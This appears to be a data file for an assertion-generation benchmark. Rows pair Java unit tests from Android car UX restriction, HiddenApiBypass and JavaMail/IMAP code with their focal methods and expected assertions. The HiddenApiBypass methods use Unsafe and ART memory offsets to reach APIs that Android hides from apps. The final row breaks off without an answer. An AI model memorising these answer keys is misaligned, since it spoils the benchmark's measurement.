"testNullActiveRestriction() { CarUxRestrictions activeRestrictions = null; boolean[] expectedResults = {true, true, true, true}; for (int i = 0; i < mRestrictionsArray.length; i++) { boolean actualResult = CarUxRestrictionsUtil.isRestricted(mRestrictionsArray[i], activeRestrictions); ""<AssertPlaceHolder>""; } }
isRestricted( @CarUxRestrictionsInfo int restrictionFlags, @Nullable CarUxRestrictions uxr) { return (uxr == null) || ((uxr.getActiveRestrictions() & restrictionFlags) != 0); }"	assertThat(actualResult == expectedResults[i]).isTrue()
"testOneActiveRestriction() { CarUxRestrictions activeRestrictions = new CarUxRestrictions.Builder(/* reqOpt= */true, CarUxRestrictions.UX_RESTRICTIONS_NO_DIALPAD, /* timestamp= */0).build(); boolean[] expectedResults = {true, false, true, true}; for (int i = 0; i < mRestrictionsArray.length; i++) { boolean actualResult = CarUxRestrictionsUtil.isRestricted(mRestrictionsArray[i], activeRestrictions); ""<AssertPlaceHolder>""; } }
isRestricted( @CarUxRestrictionsInfo int restrictionFlags, @Nullable CarUxRestrictions uxr) { return (uxr == null) || ((uxr.getActiveRestrictions() & restrictionFlags) != 0); }"	assertThat(actualResult == expectedResults[i]).isTrue()
"testMultipleActiveRestrictions() { CarUxRestrictions activeRestrictions = new CarUxRestrictions.Builder(/* reqOpt= */true, CarUxRestrictions.UX_RESTRICTIONS_NO_DIALPAD | CarUxRestrictions.UX_RESTRICTIONS_NO_TEXT_MESSAGE, /* timestamp= */ 0).build(); boolean[] expectedResults = {true, false, true, true}; for (int i = 0; i < mRestrictionsArray.length; i++) { boolean actualResult = CarUxRestrictionsUtil.isRestricted(mRestrictionsArray[i], activeRestrictions); ""<AssertPlaceHolder>""; } }
isRestricted( @CarUxRestrictionsInfo int restrictionFlags, @Nullable CarUxRestrictions uxr) { return (uxr == null) || ((uxr.getActiveRestrictions() & restrictionFlags) != 0); }"	assertThat(actualResult == expectedResults[i]).isTrue()
"GtestGetInstanceFields() { ""<AssertPlaceHolder>""; }
getInstanceFields(@NonNull Class<?> clazz) { ArrayList<Field> list = new ArrayList<>(); if (clazz.isPrimitive() || clazz.isArray()) return list; MethodHandle mh; try { Field fI = Helper.NeverCall.class.getDeclaredField(""i""); fI.setAccessible(true); mh = MethodHandles.lookup().unreflectGetter(fI); } catch (IllegalAccessException | NoSuchFieldException e) { return list; } long fields = unsafe.getLong(clazz, iFieldOffset); if (fields == 0) return list; int numFields = unsafe.getInt(fields); if (BuildConfig.DEBUG) Log.d(TAG, clazz + "" has "" + numFields + "" instance fields""); for (int i = 0; i < numFields; i++) { long field = fields + i * artFieldSize + artFieldBias; unsafe.putLong(mh, artOffset, field); unsafe.putObject(mh, infoOffset, null); try { MethodHandles.lookup().revealDirect(mh); } catch (Throwable ignored) { } MethodHandleInfo info = (MethodHandleInfo) unsafe.getObject(mh, infoOffset); Field member = (Field) unsafe.getObject(info, memberOffset); if (BuildConfig.DEBUG) Log.v(TAG, ""got "" + member.getType() + "" "" + clazz.getTypeName() + ""."" + member.getName()); list.add(member); } return list; }"	"assertTrue(HiddenApiBypass.getInstanceFields(ApplicationInfo.class).stream().anyMatch(i -> i.getName().equals(""longVersionCode"")))"
"HtestGetStaticFields() { ""<AssertPlaceHolder>""; }
getStaticFields(@NonNull Class<?> clazz) { ArrayList<Field> list = new ArrayList<>(); if (clazz.isPrimitive() || clazz.isArray()) return list; MethodHandle mh; try { Field fS = Helper.NeverCall.class.getDeclaredField(""s""); fS.setAccessible(true); mh = MethodHandles.lookup().unreflectGetter(fS); } catch (IllegalAccessException | NoSuchFieldException e) { return list; } long fields = unsafe.getLong(clazz, sFieldOffset); if (fields == 0) return list; int numFields = unsafe.getInt(fields); if (BuildConfig.DEBUG) Log.d(TAG, clazz + "" has "" + numFields + "" static fields""); for (int i = 0; i < numFields; i++) { long field = fields + i * artFieldSize + artFieldBias; unsafe.putLong(mh, artOffset, field); unsafe.putObject(mh, infoOffset, null); try { MethodHandles.lookup().revealDirect(mh); } catch (Throwable ignored) { } MethodHandleInfo info = (MethodHandleInfo) unsafe.getObject(mh, infoOffset); Field member = (Field) unsafe.getObject(info, memberOffset); if (BuildConfig.DEBUG) Log.v(TAG, ""got "" + member.getType() + "" "" + clazz.getTypeName() + ""."" + member.getName()); list.add(member); } return list; }"	"assertTrue(HiddenApiBypass.getStaticFields(ApplicationInfo.class).stream().anyMatch(i -> i.getName().equals(""HIDDEN_API_ENFORCEMENT_DEFAULT"")))"
"KgetAllMethodsWithoutExemption() { ""<AssertPlaceHolder>""; }
getDeclaredMethods(@NonNull Class<?> clazz) { ArrayList<Executable> list = new ArrayList<>(); if (clazz.isPrimitive() || clazz.isArray()) return list; MethodHandle mh; try { Method mA = Helper.NeverCall.class.getDeclaredMethod(""a""); mA.setAccessible(true); mh = MethodHandles.lookup().unreflect(mA); } catch (NoSuchMethodException | IllegalAccessException e) { return list; } long methods = unsafe.getLong(clazz, methodsOffset); if (methods == 0) return list; int numMethods = unsafe.getInt(methods); if (BuildConfig.DEBUG) Log.d(TAG, clazz + "" has "" + numMethods + "" methods""); for (int i = 0; i < numMethods; i++) { long method = methods + i * artMethodSize + artMethodBias; unsafe.putLong(mh, artOffset, method); unsafe.putObject(mh, infoOffset, null); try { MethodHandles.lookup().revealDirect(mh); } catch (Throwable ignored) { } MethodHandleInfo info = (MethodHandleInfo) unsafe.getObject(mh, infoOffset); Executable member = (Executable) unsafe.getObject(info, memberOffset); if (BuildConfig.DEBUG) Log.v(TAG, ""got "" + clazz.getTypeName() + ""."" + member.getName() + ""("" + Arrays.stream(member.getParameterTypes()).map(Type::getTypeName).collect(Collectors.joining()) + "")""); list.add(member); } return list; }"	"assertTrue(HiddenApiBypass.getDeclaredMethods(ApplicationInfo.class).stream().anyMatch(e -> e.getName().equals(""getHiddenApiEnforcementPolicy"")))"
"Exception { MimeMessage msg = new MimeMessage(session);  // create the Multipart and its parts to it MultipartReport mp = new MultipartReport(); mp.setText(""test Multipart Report\n"");  DeliveryStatus ds = new DeliveryStatus(); InternetHeaders mdsn = new InternetHeaders(); mdsn.setHeader(""Reporting-MTA"", ""test""); ds.setMessageDSN(mdsn); InternetHeaders rdsn = new InternetHeaders(); rdsn.setHeader(""Final-Recipient"", ""joe""); rdsn.setHeader(""Action"", ""none""); rdsn.setHeader(""Status"", ""none""); ds.addRecipientDSN(rdsn); mp.setReport(ds); msg.setContent(mp); msg.saveChanges(); msg.writeTo(new NullOutputStream()); // anything other than an exception is success ""<AssertPlaceHolder>""; }
setReport(Report report) throws MessagingException { MimeBodyPart mbp = new MimeBodyPart(); ContentType ct = new ContentType(contentType); String reportType = report.getType(); ct.setParameter(""report-type"", reportType); contentType = ct.toString(); ct = new ContentType(""message"", reportType, null); mbp.setContent(report, ct.toString()); setBodyPart(mbp, 1); }"	"assertTrue(""MultipartReport constructed"", true)"
"ProtocolException { try (LayerAbstractSocket s = new Layer1of5()) { findSocketChannel(s); ""<AssertPlaceHolder>""; } }
findSocketChannel(Socket socket) { //Search class hierarchy for field name socket regardless of modifier. //Old versions of Android and even versions of Conscrypt use this name. for (Class<?> k = socket.getClass(); k != Object.class; k = k.getSuperclass()) { try { Field f = k.getDeclaredField(""socket""); f.setAccessible(true); Socket s = (Socket) f.get(socket); if (s != socket) { //reference compare only SocketChannel ret = s.getChannel(); if (ret != null) { return ret; } } } catch (Exception ignore) { //ignore anything that might go wrong } }  //Search class hierarchy for fields that can hold a Socket //or subclass regardless of modifier but ignoring synthetic fields. //Fields declared as super types of Socket be ignored. for (Class<?> k = socket.getClass(); k != Object.class; k = k.getSuperclass()) { try { for (Field f : k.getDeclaredFields()) { if (Socket.class.isAssignableFrom(f.getType()) && !f.isSynthetic()) { try { f.setAccessible(true); Socket s = (Socket) f.get(socket); if (s != socket) { //reference compare only SocketChannel ret = s.getChannel(); if (ret != null) { return ret; } } } catch (Exception ignore) { //ignore anything that might go wrong } } } } catch (Exception ignore) { //ignore anything that might go wrong } } return null; }"	assertTrue(s.foundChannel())
"ProtocolException { try (LayerAbstractSocket s = new Layer2of5()) { findSocketChannel(s); ""<AssertPlaceHolder>""; } }
findSocketChannel(Socket socket) { //Search class hierarchy for field name socket regardless of modifier. //Old versions of Android and even versions of Conscrypt use this name. for (Class<?> k = socket.getClass(); k != Object.class; k = k.getSuperclass()) { try { Field f = k.getDeclaredField(""socket""); f.setAccessible(true); Socket s = (Socket) f.get(socket); if (s != socket) { //reference compare only SocketChannel ret = s.getChannel(); if (ret != null) { return ret; } } } catch (Exception ignore) { //ignore anything that might go wrong } }  //Search class hierarchy for fields that can hold a Socket //or subclass regardless of modifier but ignoring synthetic fields. //Fields declared as super types of Socket be ignored. for (Class<?> k = socket.getClass(); k != Object.class; k = k.getSuperclass()) { try { for (Field f : k.getDeclaredFields()) { if (Socket.class.isAssignableFrom(f.getType()) && !f.isSynthetic()) { try { f.setAccessible(true); Socket s = (Socket) f.get(socket); if (s != socket) { //reference compare only SocketChannel ret = s.getChannel(); if (ret != null) { return ret; } } } catch (Exception ignore) { //ignore anything that might go wrong } } } } catch (Exception ignore) { //ignore anything that might go wrong } } return null; }"	assertTrue(s.foundChannel())
"ProtocolException { try (LayerAbstractSocket s = new Layer3of5()) { findSocketChannel(s); ""<AssertPlaceHolder>""; } }
findSocketChannel(Socket socket) { //Search class hierarchy for field name socket regardless of modifier. //Old versions of Android and even versions of Conscrypt use this name. for (Class<?> k = socket.getClass(); k != Object.class; k = k.getSuperclass()) { try { Field f = k.getDeclaredField(""socket""); f.setAccessible(true); Socket s = (Socket) f.get(socket); if (s != socket) { //reference compare only SocketChannel ret = s.getChannel(); if (ret != null) { return ret; } } } catch (Exception ignore) { //ignore anything that might go wrong } }  //Search class hierarchy for fields that can hold a Socket //or subclass regardless of modifier but ignoring synthetic fields. //Fields declared as super types of Socket be ignored. for (Class<?> k = socket.getClass(); k != Object.class; k = k.getSuperclass()) { try { for (Field f : k.getDeclaredFields()) { if (Socket.class.isAssignableFrom(f.getType()) && !f.isSynthetic()) { try { f.setAccessible(true); Socket s = (Socket) f.get(socket); if (s != socket) { //reference compare only SocketChannel ret = s.getChannel(); if (ret != null) { return ret; } } } catch (Exception ignore) { //ignore anything that might go wrong } } } } catch (Exception ignore) { //ignore anything that might go wrong } } return null; }"	assertTrue(s.foundChannel())
"ProtocolException { try (LayerAbstractSocket s = new Layer4of5()) { findSocketChannel(s); ""<AssertPlaceHolder>""; } }
findSocketChannel(Socket socket) { //Search class hierarchy for field name socket regardless of modifier. //Old versions of Android and even versions of Conscrypt use this name. for (Class<?> k = socket.getClass(); k != Object.class; k = k.getSuperclass()) { try { Field f = k.getDeclaredField(""socket""); f.setAccessible(true); Socket s = (Socket) f.get(socket); if (s != socket) { //reference compare only SocketChannel ret = s.getChannel(); if (ret != null) { return ret; } } } catch (Exception ignore) { //ignore anything that might go wrong } }  //Search class hierarchy for fields that can hold a Socket //or subclass regardless of modifier but ignoring synthetic fields. //Fields declared as super types of Socket be ignored. for (Class<?> k = socket.getClass(); k != Object.class; k = k.getSuperclass()) { try { for (Field f : k.getDeclaredFields()) { if (Socket.class.isAssignableFrom(f.getType()) && !f.isSynthetic()) { try { f.setAccessible(true); Socket s = (Socket) f.get(socket); if (s != socket) { //reference compare only SocketChannel ret = s.getChannel(); if (ret != null) { return ret; } } } catch (Exception ignore) { //ignore anything that might go wrong } } } } catch (Exception ignore) { //ignore anything that might go wrong } } return null; }"	assertTrue(s.foundChannel())
"ProtocolException { try (LayerAbstractSocket s = new Layer5of5()) { findSocketChannel(s); ""<AssertPlaceHolder>""; } }
findSocketChannel(Socket socket) { //Search class hierarchy for field name socket regardless of modifier. //Old versions of Android and even versions of Conscrypt use this name. for (Class<?> k = socket.getClass(); k != Object.class; k = k.getSuperclass()) { try { Field f = k.getDeclaredField(""socket""); f.setAccessible(true); Socket s = (Socket) f.get(socket); if (s != socket) { //reference compare only SocketChannel ret = s.getChannel(); if (ret != null) { return ret; } } } catch (Exception ignore) { //ignore anything that might go wrong } }  //Search class hierarchy for fields that can hold a Socket //or subclass regardless of modifier but ignoring synthetic fields. //Fields declared as super types of Socket be ignored. for (Class<?> k = socket.getClass(); k != Object.class; k = k.getSuperclass()) { try { for (Field f : k.getDeclaredFields()) { if (Socket.class.isAssignableFrom(f.getType()) && !f.isSynthetic()) { try { f.setAccessible(true); Socket s = (Socket) f.get(socket); if (s != socket) { //reference compare only SocketChannel ret = s.getChannel(); if (ret != null) { return ret; } } } catch (Exception ignore) { //ignore anything that might go wrong } } } } catch (Exception ignore) { //ignore anything that might go wrong } } return null; }"	assertTrue(s.foundChannel())
"ProtocolException { try (RenamedAbstractSocket s = new RenamedSocketLayer1of3()) { findSocketChannel(s); ""<AssertPlaceHolder>""; } }
findSocketChannel(Socket socket) { //Search class hierarchy for field name socket regardless of modifier. //Old versions of Android and even versions of Conscrypt use this name. for (Class<?> k = socket.getClass(); k != Object.class; k = k.getSuperclass()) { try { Field f = k.getDeclaredField(""socket""); f.setAccessible(true); Socket s = (Socket) f.get(socket); if (s != socket) { //reference compare only SocketChannel ret = s.getChannel(); if (ret != null) { return ret; } } } catch (Exception ignore) { //ignore anything that might go wrong } }  //Search class hierarchy for fields that can hold a Socket //or subclass regardless of modifier but ignoring synthetic fields. //Fields declared as super types of Socket be ignored. for (Class<?> k = socket.getClass(); k != Object.class; k = k.getSuperclass()) { try { for (Field f : k.getDeclaredFields()) { if (Socket.class.isAssignableFrom(f.getType()) && !f.isSynthetic()) { try { f.setAccessible(true); Socket s = (Socket) f.get(socket); if (s != socket) { //reference compare only SocketChannel ret = s.getChannel(); if (ret != null) { return ret; } } } catch (Exception ignore) { //ignore anything that might go wrong } } } } catch (Exception ignore) { //ignore anything that might go wrong } } return null; }"	assertTrue(s.foundChannel())
"ProtocolException { try (RenamedAbstractSocket s = new RenamedSocketLayer2of3()) { findSocketChannel(s); ""<AssertPlaceHolder>""; } }
findSocketChannel(Socket socket) { //Search class hierarchy for field name socket regardless of modifier. //Old versions of Android and even versions of Conscrypt use this name. for (Class<?> k = socket.getClass(); k != Object.class; k = k.getSuperclass()) { try { Field f = k.getDeclaredField(""socket""); f.setAccessible(true); Socket s = (Socket) f.get(socket); if (s != socket) { //reference compare only SocketChannel ret = s.getChannel(); if (ret != null) { return ret; } } } catch (Exception ignore) { //ignore anything that might go wrong } }  //Search class hierarchy for fields that can hold a Socket //or subclass regardless of modifier but ignoring synthetic fields. //Fields declared as super types of Socket be ignored. for (Class<?> k = socket.getClass(); k != Object.class; k = k.getSuperclass()) { try { for (Field f : k.getDeclaredFields()) { if (Socket.class.isAssignableFrom(f.getType()) && !f.isSynthetic()) { try { f.setAccessible(true); Socket s = (Socket) f.get(socket); if (s != socket) { //reference compare only SocketChannel ret = s.getChannel(); if (ret != null) { return ret; } } } catch (Exception ignore) { //ignore anything that might go wrong } } } } catch (Exception ignore) { //ignore anything that might go wrong } } return null; }"	assertTrue(s.foundChannel())
"ProtocolException { try (RenamedAbstractSocket s = new RenamedSocketLayer3of3()) { findSocketChannel(s); ""<AssertPlaceHolder>""; } }
findSocketChannel(Socket socket) { //Search class hierarchy for field name socket regardless of modifier. //Old versions of Android and even versions of Conscrypt use this name. for (Class<?> k = socket.getClass(); k != Object.class; k = k.getSuperclass()) { try { Field f = k.getDeclaredField(""socket""); f.setAccessible(true); Socket s = (Socket) f.get(socket); if (s != socket) { //reference compare only SocketChannel ret = s.getChannel(); if (ret != null) { return ret; } } } catch (Exception ignore) { //ignore anything that might go wrong } }  //Search class hierarchy for fields that can hold a Socket //or subclass regardless of modifier but ignoring synthetic fields. //Fields declared as super types of Socket be ignored. for (Class<?> k = socket.getClass(); k != Object.class; k = k.getSuperclass()) { try { for (Field f : k.getDeclaredFields()) { if (Socket.class.isAssignableFrom(f.getType()) && !f.isSynthetic()) { try { f.setAccessible(true); Socket s = (Socket) f.get(socket); if (s != socket) { //reference compare only SocketChannel ret = s.getChannel(); if (ret != null) { return ret; } } } catch (Exception ignore) { //ignore anything that might go wrong } } } } catch (Exception ignore) { //ignore anything that might go wrong } } return null; }"	assertTrue(s.foundChannel())
"ProtocolException { try (RenamedAbstractSocket s = new NullSocketsRenamedSocket()) { findSocketChannel(s); ""<AssertPlaceHolder>""; } }
findSocketChannel(Socket socket) { //Search class hierarchy for field name socket regardless of modifier. //Old versions of Android and even versions of Conscrypt use this name. for (Class<?> k = socket.getClass(); k != Object.class; k = k.getSuperclass()) { try { Field f = k.getDeclaredField(""socket""); f.setAccessible(true); Socket s = (Socket) f.get(socket); if (s != socket) { //reference compare only SocketChannel ret = s.getChannel(); if (ret != null) { return ret; } } } catch (Exception ignore) { //ignore anything that might go wrong } }  //Search class hierarchy for fields that can hold a Socket //or subclass regardless of modifier but ignoring synthetic fields. //Fields declared as super types of Socket be ignored. for (Class<?> k = socket.getClass(); k != Object.class; k = k.getSuperclass()) { try { for (Field f : k.getDeclaredFields()) { if (Socket.class.isAssignableFrom(f.getType()) && !f.isSynthetic()) { try { f.setAccessible(true); Socket s = (Socket) f.get(socket); if (s != socket) { //reference compare only SocketChannel ret = s.getChannel(); if (ret != null) { return ret; } } } catch (Exception ignore) { //ignore anything that might go wrong } } } } catch (Exception ignore) { //ignore anything that might go wrong } } return null; }"	assertTrue(s.foundChannel())
"ProtocolException { try (HiddenAbstractSocket s = new HiddenSocket1of2()) { //This could be implemented to find the socket. //However, we would have fetch field value to inspect the object. //Most reads will not be what we are looking for so best to give up. //Feel free to change the policy later if needed. findSocketChannel(s); ""<AssertPlaceHolder>""; } }
findSocketChannel(Socket socket) { //Search class hierarchy for field name socket regardless of modifier. //Old versions of Android and even versions of Conscrypt use this name. for (Class<?> k = socket.getClass(); k != Object.class; k = k.getSuperclass()) { try { Field f = k.getDeclaredField(""socket""); f.setAccessible(true); Socket s = (Socket) f.get(socket); if (s != socket) { //reference compare only SocketChannel ret = s.getChannel(); if (ret != null) { return ret; } } } catch (Exception ignore) { //ignore anything that might go wrong } }  //Search class hierarchy for fields that can hold a Socket //or subclass regardless of modifier but ignoring synthetic fields. //Fields declared as super types of Socket be ignored. for (Class<?> k = socket.getClass(); k != Object.class; k = k.getSuperclass()) { try { for (Field f : k.getDeclaredFields()) { if (Socket.class.isAssignableFrom(f.getType()) && !f.isSynthetic()) { try { f.setAccessible(true); Socket s = (Socket) f.get(socket); if (s != socket) { //reference compare only SocketChannel ret = s.getChannel(); if (ret != null) { return ret; } } } catch (Exception ignore) { //ignore anything that might go wrong } } } } catch (Exception ignore) { //ignore anything that might go wrong } } return null; }"	assertFalse(s.foundChannel())
"ProtocolException { try (HiddenAbstractSocket s = new HiddenSocket2of2()) { //This could be implemented to find the socket. //However, we would have fetch field value to inspect the object. //Most reads will not be what we are looking for so best to give up. //Feel free to change the policy later if needed. findSocketChannel(s); ""<AssertPlaceHolder>""; } }
findSocketChannel(Socket socket) { //Search class hierarchy for field name socket regardless of modifier. //Old versions of Android and even versions of Conscrypt use this name. for (Class<?> k = socket.getClass(); k != Object.class; k = k.getSuperclass()) { try { Field f = k.getDeclaredField(""socket""); f.setAccessible(true); Socket s = (Socket) f.get(socket); if (s != socket) { //reference compare only SocketChannel ret = s.getChannel(); if (ret != null) { return ret; } } } catch (Exception ignore) { //ignore anything that might go wrong } }  //Search class hierarchy for fields that can hold a Socket //or subclass regardless of modifier but ignoring synthetic fields. //Fields declared as super types of Socket be ignored. for (Class<?> k = socket.getClass(); k != Object.class; k = k.getSuperclass()) { try { for (Field f : k.getDeclaredFields()) { if (Socket.class.isAssignableFrom(f.getType()) && !f.isSynthetic()) { try { f.setAccessible(true); Socket s = (Socket) f.get(socket); if (s != socket) { //reference compare only SocketChannel ret = s.getChannel(); if (ret != null) { return ret; } } } catch (Exception ignore) { //ignore anything that might go wrong } } } } catch (Exception ignore) { //ignore anything that might go wrong } } return null; }"	assertFalse(s.foundChannel())
"ProtocolException { try (HiddenAbstractSocket s = new NamedNullAndHiddenSocket()) { findSocketChannel(s); ""<AssertPlaceHolder>""; } }
findSocketChannel(Socket socket) { //Search class hierarchy for field name socket regardless of modifier. //Old versions of Android and even versions of Conscrypt use this name. for (Class<?> k = socket.getClass(); k != Object.class; k = k.getSuperclass()) { try { Field f = k.getDeclaredField(""socket""); f.setAccessible(true); Socket s = (Socket) f.get(socket); if (s != socket) { //reference compare only SocketChannel ret = s.getChannel(); if (ret != null) { return ret; } } } catch (Exception ignore) { //ignore anything that might go wrong } }  //Search class hierarchy for fields that can hold a Socket //or subclass regardless of modifier but ignoring synthetic fields. //Fields declared as super types of Socket be ignored. for (Class<?> k = socket.getClass(); k != Object.class; k = k.getSuperclass()) { try { for (Field f : k.getDeclaredFields()) { if (Socket.class.isAssignableFrom(f.getType()) && !f.isSynthetic()) { try { f.setAccessible(true); Socket s = (Socket) f.get(socket); if (s != socket) { //reference compare only SocketChannel ret = s.getChannel(); if (ret != null) { return ret; } } } catch (Exception ignore) { //ignore anything that might go wrong } } } } catch (Exception ignore) { //ignore anything that might go wrong } } return null; }"	assertFalse(s.foundChannel())
"ProtocolException { try (WrappedSocket s = new SelfNamedSocket()) { findSocketChannel(s); ""<AssertPlaceHolder>""; } }
findSocketChannel(Socket socket) { //Search class hierarchy for field name socket regardless of modifier. //Old versions of Android and even versions of Conscrypt use this name. for (Class<?> k = socket.getClass(); k != Object.class; k = k.getSuperclass()) { try { Field f = k.getDeclaredField(""socket""); f.setAccessible(true); Socket s = (Socket) f.get(socket); if (s != socket) { //reference compare only SocketChannel ret = s.getChannel(); if (ret != null) { return ret; } } } catch (Exception ignore) { //ignore anything that might go wrong } }  //Search class hierarchy for fields that can hold a Socket //or subclass regardless of modifier but ignoring synthetic fields. //Fields declared as super types of Socket be ignored. for (Class<?> k = socket.getClass(); k != Object.class; k = k.getSuperclass()) { try { for (Field f : k.getDeclaredFields()) { if (Socket.class.isAssignableFrom(f.getType()) && !f.isSynthetic()) { try { f.setAccessible(true); Socket s = (Socket) f.get(socket); if (s != socket) { //reference compare only SocketChannel ret = s.getChannel(); if (ret != null) { return ret; } } } catch (Exception ignore) { //ignore anything that might go wrong } } } } catch (Exception ignore) { //ignore anything that might go wrong } } return null; }"	assertFalse(WrappedSocket.foundChannel(s))
"ProtocolException { try (WrappedSocket s = new SelfHiddenSocket()) { findSocketChannel(s); ""<AssertPlaceHolder>""; } }
findSocketChannel(Socket socket) { //Search class hierarchy for field name socket regardless of modifier. //Old versions of Android and even versions of Conscrypt use this name. for (Class<?> k = socket.getClass(); k != Object.class; k = k.getSuperclass()) { try { Field f = k.getDeclaredField(""socket""); f.setAccessible(true); Socket s = (Socket) f.get(socket); if (s != socket) { //reference compare only SocketChannel ret = s.getChannel(); if (ret != null) { return ret; } } } catch (Exception ignore) { //ignore anything that might go wrong } }  //Search class hierarchy for fields that can hold a Socket //or subclass regardless of modifier but ignoring synthetic fields. //Fields declared as super types of Socket be ignored. for (Class<?> k = socket.getClass(); k != Object.class; k = k.getSuperclass()) { try { for (Field f : k.getDeclaredFields()) { if (Socket.class.isAssignableFrom(f.getType()) && !f.isSynthetic()) { try { f.setAccessible(true); Socket s = (Socket) f.get(socket); if (s != socket) { //reference compare only SocketChannel ret = s.getChannel(); if (ret != null) { return ret; } } } catch (Exception ignore) { //ignore anything that might go wrong } } } } catch (Exception ignore) { //ignore anything that might go wrong } } return null; }"	assertFalse(WrappedSocket.foundChannel(s))
"Exception { Response r = new Response(""* "" + ""atom] ""); ""<AssertPlaceHolder>""; }
readAtomString() { return (String) parseString(true, true); }"	"assertEquals(""atom]"", r.readAtomString())"
"Exception { Response r = new Response(""* "" + ""(A B C)""); ""<AssertPlaceHolder>""; }
readAtomStringList() { return readStringList(true); }"	"assertArrayEquals(new String[]{""A"", ""B"", ""C""}, r.readAtomStringList())"
"Exception { Response r = new Response(""* "" + ""( A B C)""); ""<AssertPlaceHolder>""; }
readAtomStringList() { return readStringList(true); }"	"assertArrayEquals(new String[]{""A"", ""B"", ""C""}, r.readAtomStringList())"
"Exception { Response r = new Response(""* "" + ""(A B C )""); ""<AssertPlaceHolder>""; }
readAtomStringList() { return readStringList(true); }"	"assertArrayEquals(new String[]{""A"", ""B"", ""C""}, r.readAtomStringList())"
"Exception { Response r = new Response(""* "" + ""( A B C )""); ""<AssertPlaceHolder>""; }
readAtomStringList() { return readStringList(true); }"	"assertArrayEquals(new String[]{""A"", ""B"", ""C""}, r.readAtomStringList())"
"Exception { Response r = new Response(""* "" + ""(A  B    C)""); ""<AssertPlaceHolder>""; }
readAtomStringList() { return readStringList(true); }"	"assertArrayEquals(new String[]{""A"", ""B"", ""C""}, r.readAtomStringList())"
"Exception { Response r = new Response(""* "" + ""(A B ""C"")""); ""<AssertPlaceHolder>""; }
readAtomStringList() { return readStringList(true); }"	"assertArrayEquals(new String[]{""A"", ""B"", ""C""}, r.readAtomStringList())"
"Exception { Response r = new Response(""* "" + ""()""); ""<AssertPlaceHolder>""; }
readAtomStringList() { return readStringList(true); }"	assertArrayEquals(new String[0], r.readAtomStringList())
"testUtf7FolderNameDelete() { testWithHandler( new IMAPTest() { @Override public void test(Store store, IMAPHandler handler) throws MessagingException, IOException { Folder test = store.getFolder(utf8Folder); ""<AssertPlaceHolder>""; } }, new IMAPHandler() { @Override public void delete(String line) throws IOException { StringTokenizer st = new StringTokenizer(line); st.nextToken();    // skip tag st.nextToken();    // skip ""DELETE"" String name = st.nextToken(); if (name.equals(utf7Folder)) ok(); else no(""wrong name""); } }); }
delete(boolean recurse) throws MessagingException { checkClosed(); // insure that this folder is closed.  if (recurse) { // Delete all subfolders. Folder[] f = list(); for (int i = 0; i < f.length; i++) f[i].delete(recurse); // ignore intermediate failures }  // Attempt to delete this folder  Object ret = doCommandIgnoreFailure(new ProtocolCommand() { @Override public Object doCommand(IMAPProtocol p) throws ProtocolException { p.delete(fullName); return Boolean.TRUE; } });  if (ret == null) // Non-existent folder/No permission ?? return false;  // DELETE succeeded. exists = false; attributes = null;  // Notify listeners on self and our Store notifyFolderListeners(FolderEvent.DELETED); return true; }"	assertTrue(test.delete(false))
"testUtf8FolderNameDelete() { testWithHandler( new IMAPTest() { @Override public void test(Store store, IMAPHandler handler) throws MessagingException, IOException { Folder test = store.getFolder(utf8Folder); ""<AssertPlaceHolder>""; } }, new IMAPUtf8Handler() { @Override public void delete(String line) throws IOException { StringTokenizer st = new StringTokenizer(line); st.nextToken();    // skip tag st.nextToken();    // skip ""DELETE"" String name = unquote(st.nextToken()); if (name.equals(utf8Folder)) ok(); else no(""wrong name""); } }); }
delete(boolean recurse) throws MessagingException { checkClosed(); // insure that this folder is closed.  if (recurse) { // Delete all subfolders. Folder[] f = list(); for (int i = 0; i < f.length; i++) f[i].delete(recurse); // ignore intermediate failures }  // Attempt to delete this folder  Object ret = doCommandIgnoreFailure(new ProtocolCommand() { @Override public Object doCommand(IMAPProtocol p) throws ProtocolException { p.delete(fullName); return Boolean.TRUE; } });  if (ret == null) // Non-existent folder/No permission ?? return false;  // DELETE succeeded. exists = false; attributes = null;  // Notify listeners on self and our Store notifyFolderListeners(FolderEvent.DELETED); return true; }"	assertTrue(test.delete(false))
"testUtf7FolderNameStatus() { testWithHandler( new IMAPTest() { @Override public void test(Store store, IMAPHandler handler) throws MessagingException, IOException { Folder test = store.getFolder(utf8Folder); ""<AssertPlaceHolder>""; } }, new IMAPHandler() { @Override public void status(String line) throws IOException { StringTokenizer st = new StringTokenizer(line); st.nextToken();    // skip tag st.nextToken();    // skip ""STATUS"" String name = st.nextToken(); if (name.equals(utf7Folder)) { untagged(""STATUS "" + utf7Folder + "" (UIDVALIDITY 123)""); ok(); } else no(""wrong name""); } }); }
getUIDValidity() throws MessagingException { if (opened) // we already have this information return uidvalidity;  IMAPProtocol p = null; Status status = null;  try { p = getStoreProtocol();    // XXX String[] item = {""UIDVALIDITY""}; status = p.status(fullName, item); } catch (BadCommandException bex) { // Probably a RFC1730 server throw new MessagingException(""Cannot obtain UIDValidity"", bex); } catch (ConnectionException cex) { // Oops, the store or folder died on us. throwClosedException(cex); } catch (ProtocolException pex) { throw new MessagingException(pex.getMessage(), pex); } finally { releaseStoreProtocol(p); }  if (status == null) throw new MessagingException(""Cannot obtain UIDValidity""); return status.uidvalidity; }"	assertEquals(123, ((UIDFolder) test).getUIDValidity())
"testUtf8FolderNameStatus() { testWithHandler( new IMAPTest() { @Override public void test(Store store, IMAPHandler handler) throws MessagingException, IOException { Folder test = store.getFolder(utf8Folder); ""<AssertPlaceHolder>""; } }, new IMAPUtf8Handler() { @Override public void status(String line) throws IOException { StringTokenizer st = new StringTokenizer(line); st.nextToken();    // skip tag st.nextToken();    // skip ""STATUS"" String name = unquote(st.nextToken()); if (name.equals(utf8Folder)) { untagged(""STATUS """" + utf8Folder + """" (UIDVALIDITY 123)""); ok(); } else no(""wrong name""); } }); }
getUIDValidity() throws MessagingException { if (opened) // we already have this information return uidvalidity;  IMAPProtocol p = null; Status status = null;  try { p = getStoreProtocol();    // XXX String[] item = {""UIDVALIDITY""}; status = p.status(fullName, item); } catch (BadCommandException bex) { // Probably a RFC1730 server throw new MessagingException(""Cannot obtain UIDValidity"", bex); } catch (ConnectionException cex) { // Oops, the store or folder died on us. throwClosedException(cex); } catch (ProtocolException pex) { throw new MessagingException(pex.getMessage(), pex); } finally { releaseStoreProtocol(p); }  if (status == null) throw new MessagingException(""Cannot obtain UIDValidity""); return status.uidvalidity; }"	assertEquals(123, ((UIDFolder) test).getUIDValidity())
"testUidNotStickyFalse() { testWithHandler( new IMAPTest() { @Override public void test(Store store, IMAPHandler handler) throws MessagingException, IOException { Folder test = store.getFolder(""test""); try { test.open(Folder.READ_WRITE); ""<AssertPlaceHolder>""; } finally { test.close(); } } }, new IMAPHandler()); }
